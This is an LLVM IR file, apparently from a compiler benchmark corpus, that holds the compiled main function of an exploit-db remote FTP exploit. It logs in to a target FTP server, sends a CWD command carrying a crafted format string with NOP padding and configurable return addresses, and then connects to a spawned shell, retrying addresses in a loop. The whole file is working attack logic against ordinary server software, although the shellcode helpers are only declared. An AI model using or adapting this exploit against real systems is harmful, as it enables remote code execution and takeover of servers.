; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_25321.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_25321.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32, i32, i32, i8*, i8*, i8*, i8* }

@.str = private unnamed_addr constant [4 x i8] c"ftp\00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"ftp@\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c"127.0.0.1\00", align 1
@BUFSIZE = common dso_local global i32 0, align 4
@stderr = common dso_local global i32* null, align 8
@ELITEBANNER = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [24 x i8] c"b:u:p:w:g:P:n:a:r:hv:t:\00", align 1
@EOF = common dso_local global i32 0, align 4
@optarg = common dso_local global i32 0, align 4
@tg = common dso_local global %struct.TYPE_2__* null, align 8
@.str.4 = private unnamed_addr constant [21 x i8] c"[+] Using target %s\0A\00", align 1
@.str.5 = private unnamed_addr constant [20 x i8] c"Bad hostname or ip.\00", align 1
@.str.6 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.7 = private unnamed_addr constant [24 x i8] c"Cannot connect to host.\00", align 1
@.str.8 = private unnamed_addr constant [25 x i8] c"[+] Trying to log in...\0A\00", align 1
@.str.9 = private unnamed_addr constant [10 x i8] c"USER %s\0D\0A\00", align 1
@.str.10 = private unnamed_addr constant [10 x i8] c"PASS %s\0D\0A\00", align 1
@.str.11 = private unnamed_addr constant [10 x i8] c"logged in\00", align 1
@.str.12 = private unnamed_addr constant [32 x i8] c"Cannot log in, wrong user/pwd ?\00", align 1
@.str.13 = private unnamed_addr constant [33 x i8] c"[+] Doing the actual exploit...\0A\00", align 1
@.str.14 = private unnamed_addr constant [8 x i8] c"CWD /\0D\0A\00", align 1
@.str.15 = private unnamed_addr constant [5 x i8] c"CWD \00", align 1
@NOP = common dso_local global i32 0, align 4
@.str.16 = private unnamed_addr constant [70 x i8] c"[+] Using written=%d align=%d retaddr=0x%.08x retloc=0x%.08x nops=%d\0A\00", align 1
@.str.17 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.18 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.19 = private unnamed_addr constant [7 x i8] c"QUIT\0D\0A\00", align 1
@.str.20 = private unnamed_addr constant [9 x i8] c"[-] Bye\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i64, align 8
  %18 = alloca i64, align 8
  %19 = alloca i8*, align 8
  %20 = alloca i32*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %7, align 4
  store i32 21, i32* %8, align 4
  store i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0), i8** %9, align 8
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0), i8** %10, align 8
  store i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0), i8** %11, align 8
  store i32 0, i32* %15, align 4
  %21 = load i32, i32* @BUFSIZE, align 4
  %22 = zext i32 %21 to i64
  %23 = call i8* @llvm.stacksave()
  store i8* %23, i8** %16, align 8
  %24 = alloca i8, i64 %22, align 16
  store i64 %22, i64* %17, align 8
  %25 = load i32, i32* @BUFSIZE, align 4
  %26 = zext i32 %25 to i64
  %27 = alloca i8, i64 %26, align 16
  store i64 %26, i64* %18, align 8
  %28 = call i64 @xmalloc(i32 10000)
  %29 = inttoptr i64 %28 to i8*
  store i8* %29, i8** %19, align 8
  store i32* null, i32** %20, align 8
  %30 = load i32*, i32** @stderr, align 8
  %31 = load i8*, i8** @ELITEBANNER, align 8
  %32 = call i32 (i32*, i8*, ...) @fprintf(i32* %30, i8* %31)
  %33 = load i32, i32* %4, align 4
  %34 = icmp slt i32 %33, 2
  br i1 %34, label %35, label %41

35:                                               ; preds = %2
  %36 = load i8**, i8*** %5, align 8
  %37 = getelementptr inbounds i8*, i8** %36, i64 0
  %38 = load i8*, i8** %37, align 8
  %39 = call i32 @usage(i8* %38)
  %40 = call i32 @exit(i32 -1) #4
  unreachable

41:                                               ; preds = %2
  br label %42

42:                                               ; preds = %121, %41
  %43 = load i32, i32* %4, align 4
  %44 = load i8**, i8*** %5, align 8
  %45 = call i32 @getopt(i32 %43, i8** %44, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i64 0, i64 0))
  store i32 %45, i32* %12, align 4
  %46 = load i32, i32* @EOF, align 4
  %47 = icmp ne i32 %45, %46
  br i1 %47, label %48, label %122

48:                                               ; preds = %42
  %49 = load i32, i32* %12, align 4
  switch i32 %49, label %115 [
    i32 98, label %50
    i32 116, label %54
    i32 118, label %58
    i32 117, label %61
    i32 112, label %64
    i32 119, label %67
    i32 103, label %76
    i32 80, label %84
    i32 110, label %88
    i32 97, label %96
    i32 114, label %105
    i32 104, label %114
  ]

50:                                               ; preds = %48
  %51 = load i32, i32* @optarg, align 4
  %52 = call i8* @strtoul(i32 %51, i32* null, i32 16)
  %53 = ptrtoint i8* %52 to i32
  store i32 %53, i32* %7, align 4
  br label %121

54:                                               ; preds = %48
  %55 = load i32, i32* @optarg, align 4
  %56 = call i8* @atoi(i32 %55)
  %57 = ptrtoint i8* %56 to i32
  store i32 %57, i32* %15, align 4
  br label %121

58:                                               ; preds = %48
  %59 = load i32, i32* @optarg, align 4
  %60 = call i8* @strdup(i32 %59)
  store i8* %60, i8** %11, align 8
  br label %121

61:                                               ; preds = %48
  %62 = load i32, i32* @optarg, align 4
  %63 = call i8* @strdup(i32 %62)
  store i8* %63, i8** %9, align 8
  br label %121

64:                                               ; preds = %48
  %65 = load i32, i32* @optarg, align 4
  %66 = call i8* @strdup(i32 %65)
  store i8* %66, i8** %10, align 8
  br label %121

67:                                               ; preds = %48
  %68 = load i32, i32* @optarg, align 4
  %69 = call i8* @atoi(i32 %68)
  %70 = ptrtoint i8* %69 to i32
  %71 = load %struct.TYPE_2__*, %struct.TYPE_2__** @tg, align 8
  %72 = load i32, i32* %15, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %71, i64 %73
  %75 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %74, i32 0, i32 0
  store i32 %70, i32* %75, align 8
  br label %121

76:                                               ; preds = %48
  %77 = load i32, i32* @optarg, align 4
  %78 = call i8* @strtoul(i32 %77, i32* null, i32 16)
  %79 = load %struct.TYPE_2__*, %struct.TYPE_2__** @tg, align 8
  %80 = load i32, i32* %15, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %79, i64 %81
  %83 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %82, i32 0, i32 5
  store i8* %78, i8** %83, align 8
  br label %121

84:                                               ; preds = %48
  %85 = load i32, i32* @optarg, align 4
  %86 = call i8* @atoi(i32 %85)
  %87 = ptrtoint i8* %86 to i32
  store i32 %87, i32* %8, align 4
  br label %121

88:                                               ; preds = %48
  %89 = load i32, i32* @optarg, align 4
  %90 = call i8* @atoi(i32 %89)
  %91 = load %struct.TYPE_2__*, %struct.TYPE_2__** @tg, align 8
  %92 = load i32, i32* %15, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %91, i64 %93
  %95 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %94, i32 0, i32 6
  store i8* %90, i8** %95, align 8
  br label %121

96:                                               ; preds = %48
  %97 = load i32, i32* @optarg, align 4
  %98 = call i8* @atoi(i32 %97)
  %99 = ptrtoint i8* %98 to i32
  %100 = load %struct.TYPE_2__*, %struct.TYPE_2__** @tg, align 8
  %101 = load i32, i32* %15, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %100, i64 %102
  %104 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %103, i32 0, i32 1
  store i32 %99, i32* %104, align 4
  br label %121

105:                                              ; preds = %48
  %106 = load i32, i32* @optarg, align 4
  %107 = call i8* @strtoul(i32 %106, i32* null, i32 16)
  %108 = ptrtoint i8* %107 to i32
  %109 = load %struct.TYPE_2__*, %struct.TYPE_2__** @tg, align 8
  %110 = load i32, i32* %15, align 4
  %111 = sext i32 %110 to i64
  %112 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %109, i64 %111
  %113 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %112, i32 0, i32 2
  store i32 %108, i32* %113, align 8
  br label %121

114:                                              ; preds = %48
  br label %115

115:                                              ; preds = %48, %114
  %116 = load i8**, i8*** %5, align 8
  %117 = getelementptr inbounds i8*, i8** %116, i64 0
  %118 = load i8*, i8** %117, align 8
  %119 = call i32 @usage(i8* %118)
  %120 = call i32 @exit(i32 -1) #4
  unreachable

121:                                              ; preds = %105, %96, %88, %84, %76, %67, %64, %61, %58, %54, %50
  br label %42

122:                                              ; preds = %42
  %123 = load i32*, i32** @stderr, align 8
  %124 = load %struct.TYPE_2__*, %struct.TYPE_2__** @tg, align 8
  %125 = load i32, i32* %15, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %124, i64 %126
  %128 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %127, i32 0, i32 3
  %129 = load i8*, i8** %128, align 8
  %130 = call i32 (i32*, i8*, ...) @fprintf(i32* %123, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.4, i64 0, i64 0), i8* %129)
  %131 = load i8*, i8** %11, align 8
  %132 = call i32 @res(i8* %131)
  store i32 %132, i32* %6, align 4
  %133 = icmp eq i32 %132, -1
  br i1 %133, label %134, label %136

134:                                              ; preds = %122
  %135 = call i32 @die(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.5, i64 0, i64 0))
  br label %136

136:                                              ; preds = %134, %122
  br label %137

137:                                              ; preds = %309, %136
  %138 = load i32, i32* %6, align 4
  %139 = load i32, i32* %8, align 4
  %140 = call i32 @connect_to_host(i32 %138, i32 %139)
  store i32 %140, i32* %14, align 4
  %141 = icmp sgt i32 %140, 0
  br i1 %141, label %142, label %145

142:                                              ; preds = %137
  %143 = load i32, i32* %14, align 4
  %144 = call i32* @fdopen(i32 %143, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i64 0, i64 0))
  store i32* %144, i32** %20, align 8
  br label %147

145:                                              ; preds = %137
  %146 = call i32 @die(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.7, i64 0, i64 0))
  br label %147

147:                                              ; preds = %145, %142
  %148 = load i32*, i32** @stderr, align 8
  %149 = call i32 (i32*, i8*, ...) @fprintf(i32* %148, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.8, i64 0, i64 0))
  %150 = load i32, i32* @BUFSIZE, align 4
  %151 = load i32*, i32** %20, align 8
  %152 = call i32 @answer(i8* %24, i32 %150, i32* %151)
  %153 = load i32*, i32** %20, align 8
  %154 = load i8*, i8** %9, align 8
  %155 = call i32 (i32*, i8*, ...) @fprintf(i32* %153, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.9, i64 0, i64 0), i8* %154)
  %156 = load i32, i32* @BUFSIZE, align 4
  %157 = load i32*, i32** %20, align 8
  %158 = call i32 @answer(i8* %24, i32 %156, i32* %157)
  %159 = load i32*, i32** %20, align 8
  %160 = load i8*, i8** %10, align 8
  %161 = call i32 (i32*, i8*, ...) @fprintf(i32* %159, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.10, i64 0, i64 0), i8* %160)
  %162 = load i32, i32* @BUFSIZE, align 4
  %163 = load i32*, i32** %20, align 8
  %164 = call i32 @answer(i8* %24, i32 %162, i32* %163)
  %165 = call i32* @strstr(i8* %24, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.11, i64 0, i64 0))
  %166 = icmp eq i32* %165, null
  br i1 %166, label %167, label %169

167:                                              ; preds = %147
  %168 = call i32 @die(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.12, i64 0, i64 0))
  br label %172

169:                                              ; preds = %147
  %170 = load i32*, i32** @stderr, align 8
  %171 = call i32 (i32*, i8*, ...) @fprintf(i32* %170, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.13, i64 0, i64 0))
  br label %172

172:                                              ; preds = %169, %167
  %173 = load i32*, i32** %20, align 8
  %174 = call i32 (i32*, i8*, ...) @fprintf(i32* %173, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.14, i64 0, i64 0))
  %175 = load i32, i32* @BUFSIZE, align 4
  %176 = load i32*, i32** %20, align 8
  %177 = call i32 @answer(i8* %24, i32 %175, i32* %176)
  %178 = load i32*, i32** %20, align 8
  %179 = call i32 (i32*, i8*, ...) @fprintf(i32* %178, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.15, i64 0, i64 0))
  %180 = load %struct.TYPE_2__*, %struct.TYPE_2__** @tg, align 8
  %181 = load i32, i32* %15, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %180, i64 %182
  %184 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %183, i32 0, i32 1
  %185 = load i32, i32* %184, align 4
  %186 = load %struct.TYPE_2__*, %struct.TYPE_2__** @tg, align 8
  %187 = load i32, i32* %15, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %186, i64 %188
  %190 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %189, i32 0, i32 6
  %191 = load i8*, i8** %190, align 8
  %192 = load %struct.TYPE_2__*, %struct.TYPE_2__** @tg, align 8
  %193 = load i32, i32* %15, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %192, i64 %194
  %196 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %195, i32 0, i32 5
  %197 = load i8*, i8** %196, align 8
  %198 = load i32, i32* %7, align 4
  %199 = icmp ne i32 %198, 0
  br i1 %199, label %200, label %202

200:                                              ; preds = %172
  %201 = load i32, i32* %7, align 4
  br label %209

202:                                              ; preds = %172
  %203 = load %struct.TYPE_2__*, %struct.TYPE_2__** @tg, align 8
  %204 = load i32, i32* %15, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %203, i64 %205
  %207 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %206, i32 0, i32 2
  %208 = load i32, i32* %207, align 8
  br label %209

209:                                              ; preds = %202, %200
  %210 = phi i32 [ %201, %200 ], [ %208, %202 ]
  %211 = load %struct.TYPE_2__*, %struct.TYPE_2__** @tg, align 8
  %212 = load i32, i32* %15, align 4
  %213 = sext i32 %212 to i64
  %214 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %211, i64 %213
  %215 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %214, i32 0, i32 0
  %216 = load i32, i32* %215, align 8
  %217 = call i8* @mk_fmt_string(i32 %185, i8* %191, i8* %197, i32 %210, i32 %216)
  store i8* %217, i8** %19, align 8
  %218 = call i32 @strlen(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.15, i64 0, i64 0))
  %219 = sub nsw i32 256, %218
  %220 = load %struct.TYPE_2__*, %struct.TYPE_2__** @tg, align 8
  %221 = load i32, i32* %15, align 4
  %222 = sext i32 %221 to i64
  %223 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %220, i64 %222
  %224 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %223, i32 0, i32 4
  %225 = load i8*, i8** %224, align 8
  %226 = call i32 @strlen(i8* %225)
  %227 = sub nsw i32 %219, %226
  %228 = load i8*, i8** %19, align 8
  %229 = call i32 @strlen(i8* %228)
  %230 = sub nsw i32 %227, %229
  %231 = sub nsw i32 %230, 4
  store i32 %231, i32* %13, align 4
  %232 = load i32, i32* @NOP, align 4
  %233 = load i32, i32* %13, align 4
  %234 = call i32 @memset(i8* %27, i32 %232, i32 %233)
  %235 = load i32, i32* %13, align 4
  %236 = sext i32 %235 to i64
  %237 = getelementptr inbounds i8, i8* %27, i64 %236
  store i8 0, i8* %237, align 1
  %238 = load i32*, i32** @stderr, align 8
  %239 = load %struct.TYPE_2__*, %struct.TYPE_2__** @tg, align 8
  %240 = load i32, i32* %15, align 4
  %241 = sext i32 %240 to i64
  %242 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %239, i64 %241
  %243 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %242, i32 0, i32 0
  %244 = load i32, i32* %243, align 8
  %245 = load %struct.TYPE_2__*, %struct.TYPE_2__** @tg, align 8
  %246 = load i32, i32* %15, align 4
  %247 = sext i32 %246 to i64
  %248 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %245, i64 %247
  %249 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %248, i32 0, i32 1
  %250 = load i32, i32* %249, align 4
  %251 = load i32, i32* %7, align 4
  %252 = icmp ne i32 %251, 0
  br i1 %252, label %253, label %255

253:                                              ; preds = %209
  %254 = load i32, i32* %7, align 4
  br label %262

255:                                              ; preds = %209
  %256 = load %struct.TYPE_2__*, %struct.TYPE_2__** @tg, align 8
  %257 = load i32, i32* %15, align 4
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %256, i64 %258
  %260 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %259, i32 0, i32 2
  %261 = load i32, i32* %260, align 8
  br label %262

262:                                              ; preds = %255, %253
  %263 = phi i32 [ %254, %253 ], [ %261, %255 ]
  %264 = load %struct.TYPE_2__*, %struct.TYPE_2__** @tg, align 8
  %265 = load i32, i32* %15, align 4
  %266 = sext i32 %265 to i64
  %267 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %264, i64 %266
  %268 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %267, i32 0, i32 5
  %269 = load i8*, i8** %268, align 8
  %270 = ptrtoint i8* %269 to i32
  %271 = load i32, i32* %13, align 4
  %272 = call i32 (i32*, i8*, ...) @fprintf(i32* %238, i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.16, i64 0, i64 0), i32 %244, i32 %250, i32 %263, i32 %270, i32 %271)
  %273 = load i32*, i32** %20, align 8
  %274 = load i8*, i8** %19, align 8
  %275 = call i32 (i32*, i8*, ...) @fprintf(i32* %273, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.17, i64 0, i64 0), i8* %274)
  %276 = load i32*, i32** %20, align 8
  %277 = call i32 (i32*, i8*, ...) @fprintf(i32* %276, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.17, i64 0, i64 0), i8* %27)
  %278 = load i32*, i32** %20, align 8
  %279 = load %struct.TYPE_2__*, %struct.TYPE_2__** @tg, align 8
  %280 = load i32, i32* %15, align 4
  %281 = sext i32 %280 to i64
  %282 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %279, i64 %281
  %283 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %282, i32 0, i32 4
  %284 = load i8*, i8** %283, align 8
  %285 = call i32 (i32*, i8*, ...) @fprintf(i32* %278, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.17, i64 0, i64 0), i8* %284)
  %286 = load i32*, i32** %20, align 8
  %287 = call i32 (i32*, i8*, ...) @fprintf(i32* %286, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.18, i64 0, i64 0))
  %288 = load i32*, i32** %20, align 8
  %289 = call i32 (i32*, i8*, ...) @fprintf(i32* %288, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.19, i64 0, i64 0))
  %290 = load i32, i32* %7, align 4
  %291 = icmp ne i32 %290, 0
  br i1 %291, label %292, label %296

292:                                              ; preds = %262
  %293 = load i32, i32* %13, align 4
  %294 = load i32, i32* %7, align 4
  %295 = sub nsw i32 %294, %293
  store i32 %295, i32* %7, align 4
  br label %296

296:                                              ; preds = %292, %262
  %297 = load i32*, i32** %20, align 8
  %298 = call i32 @fclose(i32* %297)
  %299 = load i32, i32* %14, align 4
  %300 = call i32 @close(i32 %299)
  %301 = call i32 @sleep(i32 1)
  br label %302

302:                                              ; preds = %296
  %303 = load i32, i32* %6, align 4
  %304 = call i32 @shell(i32 %303)
  %305 = icmp eq i32 %304, -1
  br i1 %305, label %306, label %309

306:                                              ; preds = %302
  %307 = load i32, i32* %7, align 4
  %308 = icmp ugt i32 %307, -1073745920
  br label %309

309:                                              ; preds = %306, %302
  %310 = phi i1 [ false, %302 ], [ %308, %306 ]
  br i1 %310, label %137, label %311

311:                                              ; preds = %309
  %312 = load i32*, i32** @stderr, align 8
  %313 = call i32 (i32*, i8*, ...) @fprintf(i32* %312, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.20, i64 0, i64 0))
  store i32 49568, i32* %3, align 4
  %314 = load i8*, i8** %16, align 8
  call void @llvm.stackrestore(i8* %314)
  %315 = load i32, i32* %3, align 4
  ret i32 %315
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i64 @xmalloc(i32) #2

declare dso_local i32 @fprintf(i32*, i8*, ...) #2

declare dso_local i32 @usage(i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @getopt(i32, i8**, i8*) #2

declare dso_local i8* @strtoul(i32, i32*, i32) #2

declare dso_local i8* @atoi(i32) #2

declare dso_local i8* @strdup(i32) #2

declare dso_local i32 @res(i8*) #2

declare dso_local i32 @die(i8*) #2

declare dso_local i32 @connect_to_host(i32, i32) #2

declare dso_local i32* @fdopen(i32, i8*) #2

declare dso_local i32 @answer(i8*, i32, i32*) #2

declare dso_local i32* @strstr(i8*, i8*) #2

declare dso_local i8* @mk_fmt_string(i32, i8*, i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @fclose(i32*) #2

declare dso_local i32 @close(i32) #2

declare dso_local i32 @sleep(i32) #2

declare dso_local i32 @shell(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
